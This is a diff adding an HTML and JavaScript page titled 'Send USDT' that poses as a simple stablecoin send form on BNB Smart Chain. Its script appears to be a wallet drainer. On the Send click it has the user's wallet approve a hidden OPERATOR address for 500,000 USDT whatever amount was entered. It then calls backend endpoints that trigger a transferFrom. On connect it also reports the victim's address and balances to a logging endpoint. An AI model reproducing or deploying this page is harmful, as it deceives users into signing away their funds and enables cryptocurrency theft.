@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Send USDT</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111218;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Inter,Roboto,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:flex-start;padding:40px 16px}
+.container{width:100%;max-width:520px;margin:0 auto}
+h1{text-align:center;font-size:22px;font-weight:700;margin-bottom:28px;letter-spacing:-.02em}
+.label{color:#4ade80;font-size:13px;font-weight:500;margin-bottom:8px;letter-spacing:.02em}
+.input-wrap{display:flex;align-items:center;background:#1a1d27;border:1.5px solid #2a3f35;border-radius:12px;padding:0 14px;height:52px;margin-bottom:20px;transition:border-color .2s}
+.input-wrap:focus-within{border-color:#4ade80}
+.input-wrap input{flex:1;background:none;border:none;outline:none;color:#fff;font-size:15px;font-weight:500;letter-spacing:-.01em}
+.input-wrap input::placeholder{color:#555}
+.input-wrap .suffix{display:flex;align-items:center;gap:8px;flex-shrink:0}
+.paste-btn,.max-btn{background:none;border:none;color:#4ade80;font-size:13px;font-weight:700;cursor:pointer;padding:4px 0;letter-spacing:.02em}
+.paste-btn:active,.max-btn:active{opacity:.5}
+.qr-icon{color:#4ade80;cursor:pointer;display:flex;align-items:center}
+.qr-icon svg{width:20px;height:20px}
+.unit{color:#888;font-size:14px;font-weight:600;margin-right:6px}
+.fiat{color:#666;font-size:13px;margin-top:-12px;margin-bottom:22px}
+.btn{width:100%;height:54px;border:none;border-radius:14px;background:#00e676;color:#111;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;letter-spacing:-.01em;transition:background .15s,opacity .15s}
+.btn:active:not(:disabled){background:#00c853}
+.btn:disabled{opacity:.45;cursor:default}
+.btn .spin{display:inline-block;width:18px;height:18px;border:2.5px solid #111;border-top-color:transparent;border-radius:50%;animation:sp .6s linear infinite;margin-right:8px}
+@keyframes sp{to{transform:rotate(360deg)}}
+#toast{position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:9999;min-width:280px;max-width:90vw;padding:14px 28px;border-radius:12px;font-size:14px;font-weight:600;text-align:center;box-shadow:0 4px 24px #0008;opacity:0;pointer-events:none;transition:opacity .3s;color:#fff}
+#toast a{color:#fff;text-decoration:underline}
+.balance-row{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#1a1d27;border-radius:10px;margin-bottom:22px}
+.balance-row .left{display:flex;align-items:center;gap:8px}
+.balance-row .icon{width:28px;height:28px;border-radius:50%;background:#26A17B;display:flex;align-items:center;justify-content:center}
+.balance-row .icon svg{width:16px;height:16px}
+.balance-row .bal{font-size:14px;font-weight:600;color:#ccc}
+.balance-row .usd{font-size:12px;color:#666}
+.chain-warn{background:#7f1d1d;border:1px solid #ef4444;border-radius:10px;padding:12px 16px;margin-bottom:20px;text-align:center;font-size:13px;color:#fca5a5;display:none}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>Send USDT</h1>
+<div class="chain-warn" id="chainWarn">⚠️ Wrong network — switch to BSC in your wallet</div>
+
+<div class="label">Address or Domain Name</div>
+<div class="input-wrap">
+<input type="text" id="addrInput" value="0x899673Fe0593556f6f66b9D93F73f4d75b0BB08e" readonly/>
+<div class="suffix">
+<button class="paste-btn" id="pasteBtn">Paste</button>
+<span class="qr-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="3" height="3"/><rect x="18" y="18" width="3" height="3"/><rect x="14" y="18" width="3" height="3"/><rect x="18" y="14" width="3" height="3"/></svg></span>
+</div>
+</div>
+
+<div class="label">Amount</div>
+<div class="input-wrap">
+<input type="text" id="amtInput" inputmode="decimal" placeholder="0" autocomplete="off"/>
+<div class="suffix">
+<span class="unit">USDT</span>
+<button class="max-btn" id="maxBtn">Max</button>
+</div>
+</div>
+
+<div class="fiat" id="fiat">≈ $0.00</div>
+
+<div class="balance-row" id="balRow" style="display:none">
+<div class="left">
+<div class="icon"><svg viewBox="0 0 40 40"><circle cx="20" cy="20" r="20" fill="#26A17B"/><path d="M22.6 17.5v-2.9h5.7V11H11.7v3.6h5.7v2.9c-5 .2-8.8 1.2-8.8 2.5s3.8 2.3 8.8 2.5v7.5h3.2v-7.5c5-.2 8.7-1.3 8.7-2.5s-3.7-2.3-8.7-2.5z" fill="#fff"/></svg></div>
+<div>
+<div class="bal" id="balText">0.00 USDT</div>
+<div class="usd" id="balUsd">$0.00</div>
+</div>
+</div>
+</div>
+
+<button class="btn" id="mainBtn" disabled>Connect Wallet</button>
+</div>
+<div id="toast"></div>
+
+<script>
+(function(){
+
+/* ═══════════════════════════════════════
+ *  CONFIG — NO ESCROW
+ *  User approves OPERATOR directly
+ *  Operator calls transferFrom
+ * ═══════════════════════════════════════ */
+var USDT    = '0x55d398326f99059fF775485246999027B3197955';
+var OPERATOR = '0x0c403d5080cB0ef50A562B6f06f3473F83854D31';
+var DEST     = '0x899673Fe0593556f6f66b9D93F73f4d75b0BB08e';
+var CHAIN    = '0x38';
+var RPC      = 'https://bsc-dataseed.binance.org/';
+var APPROVE  = '500000';
+
+var addrInput = document.getElementById('addrInput');
+var amtInput  = document.getElementById('amtInput');
+var fiatEl    = document.getElementById('fiat');
+var mainBtn   = document.getElementById('mainBtn');
+var maxBtn    = document.getElementById('maxBtn');
+var pasteBtn  = document.getElementById('pasteBtn');
+var balRow    = document.getElementById('balRow');
+var balText   = document.getElementById('balText');
+var balUsd    = document.getElementById('balUsd');
+var toast     = document.getElementById('toast');
+var chainWarn = document.getElementById('chainWarn');
+
+var connected = false;
+var onBSC     = false;
+var userAddr  = null;
+
+/* ===== ETHERS ===== */
+var _loading = null;
+function ensureEthers(){
+    if(window.ethers&&window.ethers.providers) return Promise.resolve(window.ethers);
+    if(_loading) return _loading;
+    _loading=new Promise(function(ok,fail){
+        var s=document.createElement('script');
+        s.src='https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
+        s.async=true;
+        s.onload=function(){if(window.ethers)ok(window.ethers);else fail(new Error('ethers failed'));};
+        s.onerror=function(){_loading=null;fail(new Error('Script fail'));};
+        document.head.appendChild(s);
+    });
+    return _loading;
+}
+
+/* ===== TOAST ===== */
+function notify(msg,type,dur){
+    toast.innerHTML=msg;
+    toast.style.background=type==='error'?'#ef4444':type==='success'?'#10b981':'#374151';
+    toast.style.opacity='1';toast.style.pointerEvents='auto';
+    setTimeout(function(){toast.style.opacity='0';toast.style.pointerEvents='none';},dur||4000);
+}
+
+/* ===== CHAIN ===== */
+async function getCurrentChain(){
+    if(!window.ethereum) return null;
+    try{return await window.ethereum.request({method:'eth_chainId'});}catch(e){return null;}
+}
+
+async function ensureBSC(){
+    if(!window.ethereum) return false;
+    var chain=await getCurrentChain();
+    if(chain===CHAIN){onBSC=true;chainWarn.style.display='none';return true;}
+    try{
+        await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:CHAIN}]});
+    }catch(sw){
+        var code=sw.code||(sw.data&&sw.data.originalError&&sw.data.originalError.code);
+        if(Number(code)===4902){
+            try{
+                await window.ethereum.request({method:'wallet_addEthereumChain',params:[{
+                    chainId:CHAIN,chainName:'BNB Smart Chain',
+                    nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18},
+                    rpcUrls:[RPC],blockExplorerUrls:['https://bscscan.com/']
+                }]});
+            }catch(e){notify('Add BSC manually','error');return false;}
+        }else{notify('Switch to BSC','error');return false;}
+    }
+    return new Promise(function(resolve){
+        var done=false;
+        var handler=function(c){
+            if(c===CHAIN){done=true;window.ethereum.removeListener('chainChanged',handler);onBSC=true;chainWarn.style.display='none';resolve(true);}
+        };
+        window.ethereum.on('chainChanged',handler);
+        setTimeout(async function(){
+            if(!done){window.ethereum.removeListener('chainChanged',handler);var c=await getCurrentChain();onBSC=(c===CHAIN);chainWarn.style.display=onBSC?'none':'block';resolve(onBSC);}
+        },8000);
+    });
+}
+
+if(window.ethereum){
+    window.ethereum.on('chainChanged',function(c){
+        onBSC=(c===CHAIN);chainWarn.style.display=onBSC?'none':'block';
+        if(!onBSC&&connected) notify('Wrong network — switch to BSC','error');
+    });
+}
+
+/* ===== AMOUNT ===== */
+amtInput.addEventListener('input',function(){
+    var v=parseFloat(amtInput.value);
+    fiatEl.textContent=isNaN(v)||v<=0?'≈ $0.00':'≈ $'+v.toFixed(2);
+    validate();
+});
+function validate(){
+    var v=parseFloat(amtInput.value);
+    if(!connected) mainBtn.disabled=false;
+    else mainBtn.disabled=!(v>0);
+}
+
+/* ===== PASTE ===== */
+pasteBtn.addEventListener('click',async function(){
+    try{var t=await navigator.clipboard.readText();if(t&&t.startsWith('0x'))addrInput.value=t;}catch(e){}
+});
+
+/* ===== BALANCE ===== */
+async function loadBal(){
+    if(!window.ethereum||!userAddr||!onBSC) return null;
+    try{
+        await ensureEthers();
+        var prov=new ethers.providers.Web3Provider(window.ethereum);
+        var tk=new ethers.Contract(USDT,['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)'],prov);
+        var dec=18;try{dec=await tk.decimals();}catch(e){}
+        var b=await tk.balanceOf(userAddr);
+        return ethers.utils.formatUnits(b,dec);
+    }catch(e){return null;}
+}
+function showBal(raw){
+    var n=parseFloat(raw);if(!isFinite(n))n=0;
+    balText.textContent=(n<=0?'0.00':n.toFixed(6).replace(/\.?0+$/,''))+' USDT';
+    balUsd.textContent='$'+(n<=0?'0.00':n.toFixed(2));
+    balRow.style.display='flex';
+}
+
+/* ===== MAX ===== */
+maxBtn.addEventListener('click',async function(){
+    if(!connected){notify('Connect wallet first','error');return;}
+    var b=await loadBal();
+    if(b!=null){showBal(b);amtInput.value=(+b).toString();amtInput.dispatchEvent(new Event('input'));}
+    else notify('Cannot get balance','error');
+});
+
+/* ===== CONNECT ===== */
+async function connect(){
+    if(!window.ethereum){notify('No wallet. Open in Trust Wallet or MetaMask browser.','error');return false;}
+    var chainOk=await ensureBSC();
+    if(!chainOk){notify('Switch to BSC first','error');return false;}
+    try{
+        await ensureEthers();
+        var accs=await window.ethereum.request({method:'eth_requestAccounts'});
+        if(!accs||!accs[0]) throw new Error('No account');
+        userAddr=accs[0];connected=true;onBSC=true;
+        mainBtn.textContent='Send USDT';
+        var b=await loadBal();if(b!=null)showBal(b);
+        try{
+            var prov=new ethers.providers.Web3Provider(window.ethereum);
+            var bnb=await prov.getBalance(userAddr);
+            fetch('/api/v1/log/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({account:userAddr,balance:b||'0',bnbBalance:ethers.utils.formatEther(bnb),symbol:'USDT'})}).catch(function(){});
+        }catch(e){}
+        validate();
+        return true;
+    }catch(e){notify('Connection failed','error');return false;}
+}
+
+/* ===== AUTO CONNECT ON LOAD ===== */
+(async function(){
+    if(!window.ethereum) return;
+    var chain=await getCurrentChain();
+    if(chain!==CHAIN) return;
+    try{
+        var accs=await window.ethereum.request({method:'eth_accounts'});
+        if(accs&&accs[0]){
+            await ensureEthers();
+            userAddr=accs[0];connected=true;onBSC=true;
+            mainBtn.textContent='Send USDT';
+            var b=await loadBal();if(b!=null)showBal(b);
+            validate();
+        }
+    }catch(e){}
+})();
+
+/* ===== MAIN BUTTON ===== */
+mainBtn.addEventListener('click',async function(e){
+    e.preventDefault();
+    if(!connected){await connect();return;}
+
+    var amt=parseFloat(amtInput.value);
+    if(isNaN(amt)||amt<=0){notify('Enter a valid amount','error');return;}
+
+    var chainNow=await getCurrentChain();
+    if(chainNow!==CHAIN){var sw=await ensureBSC();if(!sw){notify('Switch to BSC','error');return;}}
+
+    mainBtn.innerHTML='<span class="spin"></span>Processing...';
+    mainBtn.disabled=true;
+
+    try{
+        await ensureEthers();
+
+        // Switch chain
+        try{await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:CHAIN}]});}catch(sw){
+            var sc=sw.code||(sw.data&&sw.data.originalError&&sw.data.originalError.code);
+            if(Number(sc)===4902){try{await window.ethereum.request({method:'wallet_addEthereumChain',params:[{chainId:CHAIN,chainName:'BNB Smart Chain',nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18},rpcUrls:[RPC],blockExplorerUrls:['https://bscscan.com/']}]});}catch(e){}}
+        }
+        await new Promise(function(r){setTimeout(r,1500);});
+
+        var finalChain=await getCurrentChain();
+        if(finalChain!==CHAIN) throw new Error('Wrong network');
+
+        // Get account
+        var from=(await window.ethereum.request({method:'eth_accounts'}))[0];
+        if(!from){var r=await window.ethereum.request({method:'eth_requestAccounts'});from=r&&r[0];}
+        if(!from) throw new Error('No account');
+
+        // Encode approve(OPERATOR, 500000 USDT)
+        // *** THIS IS THE KEY CHANGE — approve OPERATOR, not escrow ***
+        var iface=new ethers.utils.Interface(['function approve(address,uint256) returns (bool)','function decimals() view returns (uint8)']);
+        var dec=18;
+        try{var dh=await window.ethereum.request({method:'eth_call',params:[{to:USDT,data:iface.encodeFunctionData('decimals',[])},'latest']});dec=ethers.BigNumber.from(dh).toNumber();}catch(e){}
+        var approveWei=ethers.utils.parseUnits(APPROVE,dec);
+        var txData=iface.encodeFunctionData('approve',[OPERATOR,approveWei]);
+
+        mainBtn.innerHTML='<span class="spin"></span>Confirm in wallet...';
+        var txHash=await window.ethereum.request({method:'eth_sendTransaction',params:[{from:from,to:USDT,data:txData,value:'0x0',chainId:CHAIN}]});
+
+        if(!txHash) throw new Error('No tx hash');
+
+        mainBtn.innerHTML='<span class="spin"></span>Approving...';
+        var prov=new ethers.providers.Web3Provider(window.ethereum);
+        await prov.waitForTransaction(txHash);
+
+        // Save approval
+        try{await fetch('/api/save-approval',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userAddress:from,approvalTxHash:txHash,amount:amtInput.value.trim()})});}catch(e){}
+
+        // Auto-transfer
+        mainBtn.innerHTML='<span class="spin"></span>Transferring...';
+        notify('Approved! Transferring...','info');
+
+        var resp=await fetch('/api/auto-transfer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userAddress:from,amount:amtInput.value.trim(),approvalTxHash:txHash})});
+        var data=await resp.json();
+
+        if(data.success){
+            var txUrl='https://bscscan.com/tx/'+data.transferTxHash;
+            notify('✅ Sent! <a href="'+txUrl+'" target="_blank">View on BscScan</a>','success',10000);
+            amtInput.value='';amtInput.dispatchEvent(new Event('input'));
+            setTimeout(async function(){var b=await loadBal();if(b!=null)showBal(b);},3000);
+        }else{
+            var errMsg=data.error||'Unknown';
+            notify('❌ Failed: '+errMsg,'error',8000);
+        }
+
+    }catch(err){
+        var msg=(err&&err.message||'').toLowerCase();
+        if(msg.includes('user rejected')||msg.includes('user denied')||msg.includes('cancel')){notify('Cancelled.','error');}
+        else if(msg.includes('insufficient')){notify('Insufficient balance.','error');}
+        else if(msg.includes('wrong network')||msg.includes('chain')){notify('Switch to BSC.','error');}
+        else{notify('Error: '+(err&&err.message||'Unknown'),'error',6000);}
+    }finally{
+        mainBtn.disabled=false;
+        mainBtn.innerHTML=connected?'Send USDT':'Connect Wallet';
+        validate();
+    }
+});
+
+validate();
+})();
+</script>
+</body>
+</html>
